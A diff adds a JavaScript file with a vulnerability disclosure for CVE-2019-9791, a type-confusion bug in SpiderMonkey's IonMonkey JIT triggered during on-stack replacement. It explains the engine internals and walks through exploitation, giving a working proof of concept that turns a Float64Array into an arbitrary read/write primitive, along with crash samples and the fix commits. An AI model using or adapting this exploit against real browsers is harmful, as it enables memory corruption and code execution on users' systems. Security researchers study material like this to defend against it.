@@ -1,0 +1,174 @@
+/*
+A bug in IonMonkeys type inference system when JIT compiling and entering a constructor function via on-stack replacement (OSR) allows the compilation of JITed functions that cause type confusions between arbitrary objects.
+
+# Prerequisites:
+
+1. Spidermonkey can represent "plain" objects either as NativeObject (https://github.com/mozilla/gecko-dev/blob/dbddac86aadf1d4871fb350bbe66db43728a9f81/js/src/vm/NativeObject.h#L431) or as UnboxedObjects (https://github.com/mozilla/gecko-dev/blob/dbddac86aadf1d4871fb350bbe66db43728a9f81/js/src/vm/UnboxedObject.h#L168). NativeObjects are basically two pointers to type information objects (the "Group" and "Shape") as well as inline and out-of-line properties (both stored in NaN-boxed form) and elements. UnboxedObject, on the other hand, can store their properties in unboxed form, e.g. as native 32-bit integer or even 8-bit booleans. An UnboxedObject can always be converted to a NativeObject (by boxing the properties and potentially allocating out-of-line storage). This e.g. happens if, during a property assignment, the type of the new value mismatches the current type of the property. The function implementing the conversion can be found here: https://github.com/mozilla/gecko-dev/blob/dbddac86aadf1d4871fb350bbe66db43728a9f81/js/src/vm/NativeObject.h#L431
+
+2. Spidermonkey can track the possible types of object properties for the purpose of type inference: https://github.com/mozilla/gecko-dev/blob/dbddac86aadf1d4871fb350bbe66db43728a9f81/js/src/vm/ObjectGroup.h#L111. For example, after executing the following code (and assuming no other code ran that assigned a different value to a property .x), Spidermonkey will know that the property .x will always be a Uint8Array and uses that information to omit type checks in JIT compiled code.
+
+    var o = {};
+    o.x = new Uint8Array(0x1000);
+
+Assigning a value of a different type to such a property will invalidate (or widen) the inferred type and potentially invalidate any JITed code that relies on that.
+
+3. A constructor in Spidermonkey can have a "template" type (Group and potentially Shape) associated with it which represents the type of the constructed objects *after* initialization has finished. The caller of such a constructor is responsible for allocating the newly constructed object of the final type (via js::CreateThisForFunction) and passing it as argument to the constructor. As such, JITed code for a constructor can rely on receiving an object of the template type and can use that to emit code for property stores to existing properties instead of code for property definitions (which in addition to writing the property value also have to update the Shape of the object).
+As an example, consider the following constructor function:
+
+    function Ctor() {
+        this.a = 42;
+        this.b = 43;
+    }
+
+After several invocations, the type inference system will compute the final type of the constructed objects. In that case it could be UnboxedObject with two integer properties, .a and .b. At a later point IonMonkey would start JIT compiling the constructor. By relying on the fact that the caller will always pass in an object with the template type, IonMonkey can now emit code that simply stores the two values into the existing property slots. This optimization is only possible if Spidermonkey can prove that the constructed object doesn't escape the local scope before the final property definition (and so the existence of the properties before they are actually defined in the code isn't visible to the running script). The result type for constructors is computed here: https://github.com/mozilla/gecko-dev/blob/dbddac86aadf1d4871fb350bbe66db43728a9f81/js/src/vm/TypeInference-inl.h#L241
+
+# Bug Description
+
+The following program, when run in Spidermonkey built from current release, results in observable misbehaviour: it doesn't show the property .x even though it should exist. Slight mutations of it can also result in nullderef crashes when assigning the property .x, which is how the original sample was found during fuzzing.
+
+    function Hax(val, l) {
+        this.a = val;
+
+        for (let i = 0; i < l; i++) {}
+
+        this.x = 42;
+    }
+
+    for (let i = 0; i < 1000; i++) {
+        new Hax(1337, 1);
+    }
+    let obj = new Hax("asdf", 100000);
+    console.log(Object.getOwnPropertyNames(obj));
+    // prints only "a"
+
+It appears that the following is happening here:
+
+1. During repeated invocations in the outer loop, Spidermonkey's type inference system computes the resulting type for the constructed objects: an UnboxedObject with properties .a and .x of type integer. The constructor is then JIT compiled by IonMonkey, which makes use of the type inference to emit code for property stores to existing properties instead of property definitions.
+
+2. During the final invocation, the JIT code attempts to set the property .a. However, the value now has the wrong type (string instead of integer) for the object. This triggers the following:
+    - The current |this| object is converted to a NativeObject, which has the properties .a and .x
+    - The result type for Hax is updated to now be a NativeObject with the two properties .a and .x (as the type inference for the constructor can still prove that both .a and .x will always be installed)
+    - The |this| object is then "rolled back" to the type it should currently have at this position in the bytecode: https://github.com/mozilla/gecko-dev/blob/dbddac86aadf1d4871fb350bbe66db43728a9f81/js/src/vm/TypeInference.cpp#L4234. Afterwards, the Shape of |this| only indicates the existence of property .a (which is correct at the current position in the code). Presumably, this is done to avoid a situation in which script code can suddenly observe that the constructed object already has the final set of properties before they are defined in the code, which could e.g. happen if the initial analysis relied on the assumption that some function or method called in the constructor was always a specific, known function and inlined it.
+    - Due to the type inference change, the JIT code is deoptimized and execution continues in the baseline JIT.
+
+3. In the following loop, IonMonkey again starts compiling Hax, and enters into the JITed code via on-stack replacement (OSR) in the middle of the function at the head of the loop. During compilation, IonMonkey again relies on the "template" type for Hax and concludes that |this| must be a NativeObject with properties .a and .x. This is incorrect in this situation, as the rollback has removed the property .x.
+
+4. After the loop finishes, the JITed code only performs the property stores as it believes that the object already has the final Shape. As such, the property store to .x is "forgotten" and Object.getOwnPropertyNames only shows the existence of property .a
+
+# Exploitation
+
+The JITed code after OSR expects |this| to already have the final type and thus only stores the property without updating the Shape. As a result, .x will not be visible and the next property defined on the constructed object afterwards will be assigned the same slot that .x was written into in the JITed code. With that, the following exploit becomes possible, which abuses the type inference mechanism for properties:
+
+In the JITed code, after the loop:
+1. Define a property .x on |this| as above. The compiler will infer the type of .x to be type X. This property will then be "forgotten" in the final call due to the bug.
+2. Define a new property (of type Y) on the object. It will be stored into the same slot as .x (because that slot is free according the the object's Shape). This has to be a "slow path" property definition that doesn't rely on type inference and instead inspects the Shape of the object and determines the next free slot based on that.
+3. Load property .x again. The compiler will infer the type of the loaded value to be X. However, it will actually load an object of type Y
+
+As a result, it is now possible to compile JIT code that confuses an object of type X with an object of type Y where both X and Y can be arbitrarily chosen.
+
+The following JavaScript program (tested against a local Spidermonkey build and Firefox 65.0.1) demonstrates this idea. It first triggers the type confusion between a Float64Array and a custom UnboxedObject, then gains arbitrary read/write from that, and finally crashes when writing to 0x414141414141:
+
+    let ab = new ArrayBuffer(0x1000);
+    let victim = new Uint8Array(0x1000);
+
+    function Hax(val, l, trigger) {
+        // In the final invocation:
+
+        // Ultimately confuse these two objects which each other.
+        // x will (eventually) be an UnboxedObject, looking a bit like an ArrayBufferView object... :)
+        let x = {slots: 13.37, elements: 13.38, buffer: ab, length: 13.39, byteOffset: 13.40, data: []};
+        // y is a real ArrayBufferView object.
+        let y = new Float64Array(0x1000);
+
+        // * Trigger a conversion of |this| to a NativeObject.
+        // * Update Hax's template type to NativeObject with .a and .x (and potentially .y)
+        // * Trigger the "roll back" of |this| to a NativeObject with only property .a
+        // * Bailout of the JITed code due to type inference changes
+        this.a = val;
+
+        // Trigger JIT compilation and OSR entry here. During compilation, IonMonkey will
+        // incorrectly assume that |this| already has the final type (so already has property .x)
+        for (let i = 0; i < l; i++) {}
+
+        // The JITed code will now only have a property store here and won't update the Shape.
+        this.x = x;
+
+        if (trigger) {
+            // This property definition is conditional (and rarely used) so that an inline cache
+            // will be emitted for it, which will inspect the Shape of |this|. As such, .y will
+            // be put into the same slot as .x, as the Shape of |this| only shows property .a.
+            this.y = y;
+
+            // At this point, .x and .y overlap, and the JITed code below believes that the slot
+            // for .x still stores the UnboxedObject while in reality it now stores a Float64Array.
+        }
+
+        // This assignment will then corrupt the data pointer of the Float64Array to point to |victim|.
+        this.x.data = victim;
+    }
+
+    for (let i = 0; i < 1000; i++) {
+        new Hax(1337, 1, false);
+    }
+    let obj = new Hax("asdf", 10000000, true);
+
+    // Driver is now a Float64Array whose data pointer points to a Uint8Array.
+    let driver = obj.y;
+
+    // Write to address 0x414141414141 as PoC
+    driver[7] = 3.54484805889626e-310;
+    victim[0] = 42;
+
+
+ For completeness, here is a minimal crashing sample: 
+*/
+
+    function Hax(val, l) {
+        this.a = val;
+
+        for (let i = 0; i < l; i++) {}
+
+        this.x = 42;
+        this.y = 42;
+        // After conversion to a NativeObject, this property
+        // won't fit into inline storage, but out-of-line storage
+        // has not been allocated, resulting in a crash @ 0x0.
+        this.z = 42;
+    }
+
+    for (let i = 0; i < 10000; i++) {
+        new Hax(13.37, 1);
+    }
+    let obj = new Hax("asdf", 1000000);
+
+/*
+As well as the original sample that the fuzzer triggered:
+
+    // Run with --no-threads --ion-warmup-threshold=100
+
+    function v5(v6, v8) {
+        if (v8) {
+            // Triggers the rollback etc. in a recursive call.
+            const v11 = new v5(v6);
+            const v13 = new Float32Array(40183);
+            for (const v14 of v13) {
+            }
+        }
+        // This property assignment crashes as out-of-line 
+        // property storage has not been allocated yet.
+        this[-3083318214] = v6;
+    }
+    for (let v19 = 0; v19 < 1337; v19++) {
+        const v21 = new v5(32768, false);
+    }
+    const v22 = new v5(v5, true);
+
+
+ Fixed in https://www.mozilla.org/en-US/security/advisories/mfsa2019-08/#CVE-2019-9791
+
+The issue was fixed in two ways:
+
+1. In https://github.com/mozilla/gecko-dev/commit/67fc2c30797036217de91cdb4b6d77a876bed7db the conversion from UnboxedObjects to NativeObjects was changed to no longer copy the definite properties of the ObjectGroup. As a result, in step 2 above, the new NativeGroup now wouldn't have the definite properties .a and .x anymore, preventing the recompiled JIT code from relying on them.
+
+2. UnboxedObjects were disabled by default in https://github.com/mozilla/gecko-dev/commit/a4d10aaa50842ef6b15ef8982ab0c4b478ef9109 and are now (apparently) being completely removed from the engine: https://bugzilla.mozilla.org/show_bug.cgi?id=1505574
+*/
